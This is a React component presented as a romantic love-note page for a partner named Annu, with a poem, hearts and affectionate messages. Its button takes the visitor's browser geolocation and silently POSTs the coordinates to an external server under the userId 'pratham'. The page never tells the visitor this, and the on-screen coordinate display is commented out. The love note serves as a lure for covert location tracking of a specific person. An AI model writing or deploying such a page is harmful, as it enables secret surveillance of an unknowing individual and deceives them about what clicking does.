import React, { useState } from "react";

const LocationSender = () => {
  const [status, setStatus] = useState("");
  const [coords, setCoords] = useState(null);

  const sendLocation = async (latitude, longitude) => {
    try {
      const res = await fetch("https://messageweb-njt9.onrender.com/location", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          userId: "pratham",
          latitude,
          longitude,
        }),
      });

      const data = await res.json();
      console.log("Server response:", data);
      setStatus("I Love You Bauua ❤️🥰");
    } catch (err) {
      console.error(err);
      setStatus("You did something wrong⚠");
    }
  };

  const handleSendLocation = () => {
    if (!navigator.geolocation) {
      setStatus("Geolocation not supported by your browser");
      return;
    }

    setStatus("📍 Getting Started Beautiful");

    navigator.geolocation.getCurrentPosition(
        (position) => {
            const { latitude, longitude } = position.coords;
            setCoords({ latitude, longitude });
            sendLocation(latitude, longitude);
        },
        (error) => {
            console.error(error);

            if (error.code === error.PERMISSION_DENIED) {
            setStatus("⚠️ You denied location. Please enable it in browser settings.");
            } else if (error.code === error.POSITION_UNAVAILABLE) {
            setStatus("❌ Location unavailable. Turn on GPS or check network.");
            } else if (error.code === error.TIMEOUT) {
            setStatus("⌛ Location request timed out. Try again.");
            } else {
            setStatus("❌ Unknown error getting location.");
            }
        }
    );
  };

  return (
    <div style={{ textAlign: "center", marginTop: "3rem" }}>
      <h1>karti ho jhagda to bahut pyari lagti ho,
        pahenti ho jab saree to sundar aur sanskari lagti ho,
        jee karta hai kar lu der sara pyar tabhi yaad ata hai gusse me gudunnuwa humari lagti ho 💞</h1>
      <button
        onClick={handleSendLocation}
        style={{
          background: "#2563eb",
          color: "#fff",
          border: "none",
          padding: "10px 20px",
          borderRadius: "8px",
          cursor: "pointer",
          fontSize: "1rem",
        }}
      >
        Click Here 🥰
      </button>

      <p style={{ marginTop: "1rem" }}>{status}</p>

      {coords && (
        <div style={{ marginTop: "1rem" }}>
          <p>
            {/* <strong>Latitude:</strong> {coords.latitude} */}
            {coords.latitude && (
  <div
    style={{
      display: "flex",
      flexDirection: "column",
      alignItems: "center",
      gap: "0.6rem",
      marginTop: "1rem",
      padding: "1rem 1.2rem",
      borderRadius: "12px",
      boxShadow: "0 8px 24px rgba(0,0,0,0.12)",
      background: "linear-gradient(135deg,#fff7fb,#fff1f6)",
      maxWidth: "520px",
      marginLeft: "auto",
      marginRight: "auto",
      cursor: "default",
    }}
  >
    {/* Inline stylesheet for animations */}
    <style>{`
      .luv-hearts { position: relative; width: 120px; height: 40px; display: flex; justify-content: center; gap: 8px; }
      .luv-hearts span {
        font-size: 26px;
        transform-origin: center;
        animation: float 2.4s infinite ease-in-out;
        filter: drop-shadow(0 4px 8px rgba(255,0,120,0.12));
      }
      .luv-hearts span:nth-child(1){ animation-delay: 0s; }
      .luv-hearts span:nth-child(2){ animation-delay: 0.18s; transform: scale(0.95); }
      .luv-hearts span:nth-child(3){ animation-delay: 0.36s; transform: scale(0.9); }

      @keyframes float {
        0% { transform: translateY(0) scale(1); opacity: 1; }
        50% { transform: translateY(-10px) scale(1.06); opacity: 0.95; }
        100% { transform: translateY(0) scale(1); opacity: 1; }
      }

      .luv-title { font-size: 1.05rem; margin: 0; font-weight: 700; letter-spacing: 0.2px; color: #2b2b2b; text-align:center; }
      .luv-sub { margin: 0.2rem 0 0.6rem 0; font-size: 0.95rem; color: #4b4b4b; text-align:center; line-height:1.35; }
      .luv-btn {
        background: linear-gradient(90deg,#ff4da6,#ff7abf);
        border: none;
        padding: 8px 14px;
        border-radius: 999px;
        color: white;
        font-weight: 600;
        cursor: pointer;
        box-shadow: 0 6px 18px rgba(255,90,150,0.18);
      }
      .luv-btn:active { transform: translateY(1px); }
      .luv-small { font-size: 0.85rem; color: #7b7b7b; margin-top: 0.6rem; text-align:center; }
    `}</style>

    <div className="luv-hearts" aria-hidden>
      <span>💖</span>
      <span>💘</span>
      <span>✨</span>
    </div>

    <h3 className="luv-title">Annu — my Baccha, my Bauua</h3>

    <p className="luv-sub">
      Whenever I think of you, the whole world softens — your laugh becomes my song,
      your presence becomes my home. You are my favorite hello and my hardest goodbye.
      I never wanted to say you goodbye i wanted to spend my life with you , make you smile,
      adore you, love you, take care of you in the moment you feel low like you are feeling right now.
      You are everything to me so please take care of you a little bit more ❤️
    </p>

    <button
      className="luv-btn"
      title="Play message for Annu"
    >
      I love you ❤️
    </button>

    <div className="luv-small">Tip: Eat well and sleep well I love you so much my betu ❤️ — made with love.</div>
  </div>
)}
          </p>
          <p>
            {/* <strong>Longitude:</strong> {coords.longitude} */}
          </p>
          {/* <a
            href={`https://www.google.com/maps?q=${coords.latitude},${coords.longitude}`}
            target="_blank"
            rel="noreferrer"
          >
            🌍 View on Google Maps
          </a> */}
        </div>
      )}
    </div>
  );
};

export default LocationSender;
